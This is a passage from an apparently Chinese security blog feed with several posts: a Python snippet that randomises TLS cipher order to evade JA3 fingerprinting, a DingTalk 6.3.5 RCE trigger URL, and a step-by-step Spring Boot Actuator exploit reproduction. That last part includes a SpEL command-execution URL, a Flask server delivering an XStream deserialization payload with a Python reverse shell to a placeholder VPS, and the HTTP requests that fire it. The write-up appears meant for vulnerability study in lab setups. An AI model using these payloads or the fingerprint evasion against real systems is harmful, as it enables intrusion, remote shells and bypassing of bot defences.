class="string">'ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM'</span></span><br><span class="line">    <span class="string">':RSA+AES:RSA+HIGH:RSA+3DES'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DESAdapter</span><span class="params">(HTTPAdapter)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 在请求中重新启用 3DES 支持的 TransportAdapter</span></span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">":"</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        <span class="comment"># print("1:", CIPHERS)</span></span><br><span class="line">        CIPHERS = <span class="string">":"</span>.join(CIPHERS)</span><br><span class="line">        <span class="comment"># print("2:", CIPHERS)</span></span><br><span class="line">        self.COPHERS = CIPHERS + <span class="string">":!aNULL:!eNULL:!MD5"</span></span><br><span class="line">        super(DESAdapter, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在一般情况下，当我们实现一个子类的时候，__init__的第一行应该是super().__init__(*args, **kwargs)，</span></span><br><span class="line">    <span class="comment"># 但是由于init_poolmanager和proxy_manager_for是复写了父类的两个方法，</span></span><br><span class="line">    <span class="comment"># 这两个方法是在执行super().__init__(*args, **kwargs)的时候就执行的。</span></span><br><span class="line">    <span class="comment"># 所以，我们随机设置 Cipher Suits 的时候，需要放在super().__init__(*args, **kwargs)的前面。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_poolmanager</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        context = create_urllib3_context(ciphers=self.COPHERS)</span><br><span class="line">        kwargs[<span class="string">"ssl_context"</span>] = context</span><br><span class="line">        <span class="keyword">return</span> super(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proxy_manager_for</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        context = create_urllib3_context(ciphers=self.COPHERS)</span><br><span class="line">        kwargs[<span class="string">"ssl_context"</span>] = context</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67'</span>&#125;</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"修改TSL 加密算发"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="comment"># 其中，s.mount的第一个参数表示这个适配器只在https://ja3er.com开头的网址中生效</span></span><br><span class="line">        s.mount(<span class="string">"https://ja3er.com"</span>, DESAdapter())</span><br><span class="line">        response = s.get(<span class="string">"https://ja3er.com/json"</span>).json()</span><br><span class="line">        print(response)</span><br></pre></td></tr></table></figure><h2 id="方法二、修改底层的依赖requests包"><a href="#方法二、修改底层的依赖requests包" class="headerlink" title="方法二、修改底层的依赖requests包"></a>方法二、修改底层的依赖requests包</h2><p>​ 还有一个问题，代码写多了，你不可能每个代码都改一下，那不得累死，除非你写之前就把发送数据包的函数封装好了，改一个就行，要不最好的方法就是把底层的依赖包直接改了。</p><p>​ 但是其实，Requests其实是对urllib3的一个封装，所以关键的还是在 urllib库</p><p>debug找到位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;urllib3&#x2F;util&#x2F;ssl_.py</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b0464b44ef720f1622e709c27b12daa9.png" alt="image-20220208144845875"></p><p>这个是原版的的加密库</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6972c61044c4096be7e8ea1749a9a5bc.png" alt="image-20220208145318097"></p><p>根据原理，是按照字段的顺序先算一遍，再hash计算一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3&#39;: &#39;771,4866-4867-4865-52394-49196-49200-49195-49199-159-158-52393-52</span><br></pre></td></tr></table></figure><p>所以，为了最小程度变更而且不影响代码，我们只要吧Ciphers里面的加密算法调换一下顺序就好了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1eeff3622f76bc98cafbcf929ae2d24b.png" alt="image-20220208145944869"></p><h2 id="再用代码测试一下"><a href="#再用代码测试一下" class="headerlink" title="再用代码测试一下"></a>再用代码测试一下</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/44cc8a6da8024020d9d794fbe0f1b393.png" alt="image-20220208154450669"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改前：</span><br><span class="line">8896468359a279a05de2651c5021ac6f</span><br><span class="line">修改后：</span><br><span class="line">ab2825e283c7103e84b2c96ea54e41e3</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>​ 根据规则其实还有好多方法，只要你熟悉协议了解原理可以慢慢改，我这种不太懂的，就找一个最简单的方法，能实现就好了，太复杂怕把自己绕进去。。</p><p>​ 这里也只是改了一下python的代码，其他语言也是同理的。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 ssl 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钉钉 RCE 漏洞</title>
      <link href="/2022/02/16/%E9%92%89%E9%92%89%20RCE%20%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/16/%E9%92%89%E9%92%89%20RCE%20%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="钉钉-RCE-漏洞"><a href="#钉钉-RCE-漏洞" class="headerlink" title="钉钉 RCE 漏洞"></a>钉钉 RCE 漏洞</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>版本：6.3.5</p><p><a href="https://dtapp-pub.dingtalk.com/dingtalk-desktop/win\_installer/Release/DingTalk\_v6.3.5.11308701.exe" target="_blank" rel="noopener">https://dtapp-pub.dingtalk.com/dingtalk-desktop/win\_installer/Release/DingTalk\_v6.3.5.11308701.exe</a></p><h2 id="触发方式"><a href="#触发方式" class="headerlink" title="触发方式"></a>触发方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dingtalk:&#x2F;&#x2F;dingtalkclient&#x2F;page&#x2F;link?url&#x3D;127.0.0.1&#x2F;test.html&amp;pc_slide&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/22fad048cddd831a62f8d51881b57236.png" alt="image-20220216141703274"></p><h2 id="成功复现"><a href="#成功复现" class="headerlink" title="成功复现"></a>成功复现</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/8a606f1377bde83b70307a096aac7987.png" alt="image-20220216141616222"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>参考<a href="https://github.com/crazy0x70/dingtalk-RCE" target="_blank" rel="noopener">https://github.com/crazy0x70/dingtalk-RCE</a></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>升级最新版 6.3.25</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Actuator 漏洞复现合集</title>
      <link href="/2022/02/09/Spring%20Boot%20Actuator%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
      <url>/2022/02/09/Spring%20Boot%20Actuator%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Spring Boot Actuator 未授权访问漏洞在日常的测试中还是能碰到一些的，这种未授权在某些情况下是可以达到RCE的效果的，所以还有有一定价值的，下面就是对这一系列漏洞复现。</p><p>基本上就是参考这篇文章的做的复现：</p><p><a href="https://github.com/LandGrey/SpringBootVulExploit/" target="_blank" rel="noopener">LandGrey/SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list (github.com)</a></p><h1 id="Spring-Boot-Actuator简介"><a href="#Spring-Boot-Actuator简介" class="headerlink" title="Spring Boot Actuator简介"></a>Spring Boot Actuator简介</h1><p>Spring Boot Actuator端点通过 JMX 和HTTP 公开暴露给外界访问，大多数时候我们使用基于HTTP的Actuator端点，因为它们很容易通过浏览器、CURL命令、shell脚本等方式访问。</p><p>一些有用的执行器端点是：</p><p><strong>Spring Boot Actuator未授权访问</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dump - 显示线程转储（包括堆栈跟踪）</span><br><span class="line">&#x2F;autoconfig - 显示自动配置报告</span><br><span class="line">&#x2F;configprops - 显示配置属性</span><br><span class="line">&#x2F;trace - 显示最后几条HTTP消息（可能包含会话标识符）</span><br><span class="line">&#x2F;logfile - 输出日志文件的内容</span><br><span class="line">&#x2F;shutdown - 关闭应用程序</span><br><span class="line">&#x2F;info - 显示应用信息</span><br><span class="line">&#x2F;metrics - 显示当前应用的’指标’信息</span><br><span class="line">&#x2F;health - 显示应用程序的健康指标</span><br><span class="line">&#x2F;beans - 显示Spring Beans的完整列表</span><br><span class="line">&#x2F;mappings - 显示所有MVC控制器映射</span><br><span class="line">&#x2F;env - 提供对配置环境的访问</span><br><span class="line">&#x2F;restart - 重新启动应用程序</span><br></pre></td></tr></table></figure><ul><li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li><li>Spring Boot Actuator 默认的内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，比如修改成 <code>/appenv</code></li></ul><h1 id="whitelabel-error-page-SpEL-RCE"><a href="#whitelabel-error-page-SpEL-RCE" class="headerlink" title="whitelabel error page SpEL RCE"></a>whitelabel error page SpEL RCE</h1><h2 id="1-影响版本："><a href="#1-影响版本：" class="headerlink" title="1 影响版本："></a>1 影响版本：</h2><ul><li>影响版本：<br>1.1.0-1.1.12<br>1.2.0-1.2.7<br>1.3.0</li></ul><h2 id="2-漏洞原理："><a href="#2-漏洞原理：" class="headerlink" title="2 漏洞原理："></a>2 漏洞原理：</h2><ul><li>利用条件是使用了springboot的默认错误页(Whitelabel Error Page)</li></ul><ol><li><p>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</p></li><li><p>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</p></li><li><p>其中 <code>${}</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</p></li></ol><h2 id="3-验证检测方法："><a href="#3-验证检测方法：" class="headerlink" title="3 验证检测方法："></a>3 验证检测方法：</h2><h3 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h3><p>比如发现访问 <code>/article</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0c9258aa7f1261a4236914e144e0a6cd.png" alt="image-20211125105128725"></p><h3 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h3><p>输入 <code>/article?id=${7*7}</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4223dd3ce45d4bed0e1b1ab7ac9409a4.png" alt="image-20211125104910358"></p><h2 id="4-利用方法："><a href="#4-利用方法：" class="headerlink" title="4 利用方法："></a>4 利用方法：</h2><p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: Zeo</span></span><br><span class="line"><span class="comment"># python: 3.7 </span></span><br><span class="line"><span class="comment"># software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">文件说明：转换字节码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">target = <span class="string">'open -a Calculator'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += hex(ord(x)) + <span class="string">","</span></span><br><span class="line">print(result.rstrip(<span class="string">','</span>))</span><br></pre></td></tr></table></figure><p>正常访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9091&#x2F;article?id&#x3D;66</span><br></pre></td></tr></table></figure><p>执行 <code>open \-a Calculator</code> 命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;article?id&#x3D;$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b8fa78bd9991c97caa32d01dee54bb31.png" alt="image-20211125105005884"></p><h4 id="漏洞环境搭建："><a href="#漏洞环境搭建：" class="headerlink" title="漏洞环境搭建："></a>漏洞环境搭建：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce" target="_blank" rel="noopener">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p><h1 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h1><h2 id="1-利用条件："><a href="#1-利用条件：" class="headerlink" title="1 利用条件："></a>1 利用条件：</h2><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h2 id="2-漏洞原理：-1"><a href="#2-漏洞原理：-1" class="headerlink" title="2 漏洞原理："></a>2 漏洞原理：</h2><ol><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><h2 id="3-漏洞环境："><a href="#3-漏洞环境：" class="headerlink" title="3 漏洞环境："></a>3 漏洞环境：</h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce" target="_blank" rel="noopener">repository/springboot-eureka-xstream-rce</a></p><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4 漏洞复现"></a>4 漏洞复现</h2><h3 id="正常访问："><a href="#正常访问：" class="headerlink" title="正常访问："></a>正常访问：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9093&#x2F;env</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9947036f210271d066c9dd27b6059d4e.png" alt="image-20211202103040953"></p><h3 id="发现存在所需的依赖"><a href="#发现存在所需的依赖" class="headerlink" title="发现存在所需的依赖"></a>发现存在所需的依赖</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/03e55e12e2c7e93f70eeaa40af697065.png" alt=""></p><h3 id="nc-监听端口，等待反弹-shell"><a href="#nc-监听端口，等待反弹-shell" class="headerlink" title="nc 监听端口，等待反弹 shell"></a>nc 监听端口，等待反弹 shell</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/50d23e70c1807b3ad3807adf9540c49d.png" alt="image-20211202104656362"></p><h3 id="架设响应恶意-XStream-payload-的网站"><a href="#架设响应恶意-XStream-payload-的网站" class="headerlink" title="架设响应恶意 XStream payload 的网站"></a>架设响应恶意 XStream payload 的网站</h3><p>运行恶意脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- Author: LandGrey -**-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', defaults=&#123;'path': ''&#125;)</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;</span></span><br><span class="line"><span class="string">          &lt;is class="javax.crypto.CipherInputStream"&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class="javax.crypto.NullCipher"&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class="java.util.Collections$EmptyIterator"/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPSIP",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class="string"&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;"""</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">'application/xml'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">777</span>)</span><br></pre></td></tr></table></figure><h3 id="发送设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#发送设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="发送设置 eureka.client.serviceUrl.defaultZone 属性"></a>发送设置 eureka.client.serviceUrl.defaultZone 属性</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/68cb1b24da67ee6a682a2dd49a35e6c9.png" alt="image-20211202111957169"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9093</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko&#x2F;20100101 Firefox&#x2F;94.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;VPSIP:777&#x2F;example</span><br></pre></td></tr></table></figure><h3 id="刷新配置"><a href="#刷新配置" class="headerlink" title="刷新配置"></a>刷新配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;refresh HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9093</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko&#x2F;20100101 Firefox&#x2F;94.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/e1bdb9ef5995b09ff43b32fcf50fd8de.png" alt="image-20211202112136839"></p><p>成功反弹shell</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e3b12d2e6ff560f98572b888eda230fc.png" alt="image-20211202111923596"></p><h2 id="5-利用方法："><a href="#5-利用方法：" class="headerlink" title="5 利用方法："></a>5 利用方法：</h2><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py" target="_blank" rel="noopener">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p><figure 